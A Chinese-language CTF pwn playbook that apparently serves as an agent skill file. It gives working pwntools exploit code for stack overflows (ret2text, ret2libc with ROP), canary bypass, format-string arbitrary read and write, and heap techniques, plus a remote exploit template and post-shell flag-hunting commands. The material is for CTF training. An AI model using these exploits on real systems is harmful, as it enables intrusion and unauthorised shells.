# CTF PWN 子技能

## 总体流程

```
获取文件 → 静态分析 → 动态调试 → 漏洞定位 → 构造 payload → getshell → cat flag
```

---

## Phase 1：初始分析

```bash
# 文件信息
file ./binary
checksec ./binary          # 安全机制检查（需 pwntools）
strings ./binary | grep -E "(flag|/bin/sh|system|gets|scanf)"
ldd ./binary               # 动态链接库

# checksec 输出解读
# RELRO: Partial/Full     → 影响 GOT 覆写
# Stack: Canary found     → 需绕过 canary
# NX enabled              → 栈不可执行，需 ROP
# PIE enabled             → 地址随机化，需信息泄露
```

**安装 pwntools**：
```bash
pip install pwntools --break-system-packages
```

---

## Phase 2：漏洞类型识别

### 检查清单

| 函数 | 漏洞 |
|------|------|
| `gets()` | 栈溢出（无限制读入） |
| `scanf("%s")` | 栈溢出 |
| `strcpy/strcat` | 栈/堆溢出 |
| `printf(user_input)` | 格式化字符串 |
| `malloc/free` | 堆漏洞 |
| `read(0,buf,大于buf_size)` | 栈溢出 |

---

## Phase 3：栈溢出利用

### 3.1 确定溢出偏移

```python
from pwn import *
# 方法1：cyclic pattern
pattern = cyclic(200)
# 运行崩溃后，读取 EIP/RIP 值
# cyclic_find(0x61616166) → 偏移量

# 方法2：手动二分法
payload = b'A' * 100 + b'B' * 8  # 观察是否覆盖返回地址
```

### 3.2 ret2text（直接跳转到后门函数）

```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')

# 找后门函数
win_addr = elf.symbols['win']         # 或
win_addr = elf.symbols['backdoor']
win_addr = next(elf.search(b'/bin/sh')) # 找字符串

offset = 112  # 用 cyclic 确定
payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

### 3.3 ret2libc（无后门，泄露 libc 基址）

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')  # 或 libc6
p = process('./binary')

# 泄露 puts/printf/read 的 GOT 地址
rop = ROP(elf)
rop.puts(elf.got['puts'])       # 泄露 puts 地址
rop.call(elf.sym['main'])       # 返回 main 重新执行

offset = 72
payload = b'A' * offset + rop.chain()
p.sendline(payload)

puts_addr = u64(p.recvuntil(b'\n').strip().ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# 第二次 ROP
rop2 = ROP(elf)
rop2.raw(next(elf.search(asm('ret'))))   # 栈对齐（64位）
rop2.system(bin_sh)

payload2 = b'A' * offset + rop2.chain()
p.sendline(payload2)
p.interactive()
```

### 3.4 绕过 Canary

```python
# 方法1：格式化字符串泄露 canary
# 方法2：逐字节爆破（fork 程序）
# 方法3：off-by-one 不覆盖 canary

# 已知 canary 后
payload = b'A' * offset_to_canary + p64(canary) + b'B' * 8 + p64(win_addr)
```

---

## Phase 4：格式化字符串漏洞

```python
from pwn import *
p = process('./binary')

# 1. 探测参数位置（手动）
p.sendline(b"AAAA.%p.%p.%p.%p.%p.%p.%p.%p")
# 找到 0x41414141 在第几个 %p

# 2. 任意地址读取
# 第 6 个参数时：%6$s 读取第6个参数指向的字符串
offset = 6
payload = p32(target_addr) + b'.%6$s'

# 3. 任意地址写入（%n）
from pwnlib.fmtstr import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value_to_write})
p.sendline(payload)

# 常用目标：GOT 表 → 改为 system 地址
```

---

## Phase 5：堆漏洞（Glibc Heap）

```python
# 快速判断堆漏洞类型
# Use After Free (UAF)：释放后继续使用
# Double Free：同一指针 free 两次
# Heap Overflow：溢出到相邻 chunk

# tcache dup (glibc < 2.29)
# 1. free ptr 两次
# 2. malloc 获得同一地址，写入目标地址
# 3. malloc 再次获得目标地址写值

# 工具
pip install heapinspect --break-system-packages
# gdb + pwndbg/peda 动态调试
```

---

## Phase 6：完整 pwntools 模板

```python
#!/usr/bin/env python3
from pwn import *

# 配置
context.arch = 'amd64'    # 或 'i386'
context.os = 'linux'
context.log_level = 'debug'  # 调试时开，提交时关

# 加载文件
elf = ELF('./binary', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)

# 连接（本地 or 远程）
def get_conn():
    if args.REMOTE:
        return remote('challenge.host', 12345)
    else:
        return process('./binary')

def exploit():
    p = get_conn()
    
    # ===== 在这里写 exploit =====
    offset = 72
    
    # 示例：ret2text
    win = elf.sym['win']
    payload = flat(b'A' * offset, win)
    
    p.sendlineafter(b'> ', payload)
    # ===========================
    
    p.interactive()

if __name__ == '__main__':
    exploit()
```

运行：`python3 exploit.py` 或 `python3 exploit.py REMOTE`

---

## 常用 Gadget / 命令

```bash
# ROPgadget
ROPgadget --binary ./binary --rop

# one_gadget（快速 getshell）
pip install one_gadget --break-system-packages || gem install one_gadget
one_gadget ./libc.so.6

# gdb 调试
gdb ./binary
(gdb) run
(gdb) x/20gx $rsp    # 查看栈
(gdb) info functions  # 列出函数
```

---

## libc 版本识别

```bash
# 从泄露地址找版本
# https://libc.blukat.me/  (在线)
# https://github.com/niklasb/libc-database (本地)
strings ./libc.so.6 | grep "GNU C Library"
```

---

## 远程 flag 获取

Getshell 后：
```python
p.interactive()
# 然后手动输入：
# find / -name "flag*" 2>/dev/null
# cat /flag
# cat /home/ctf/flag.txt
```
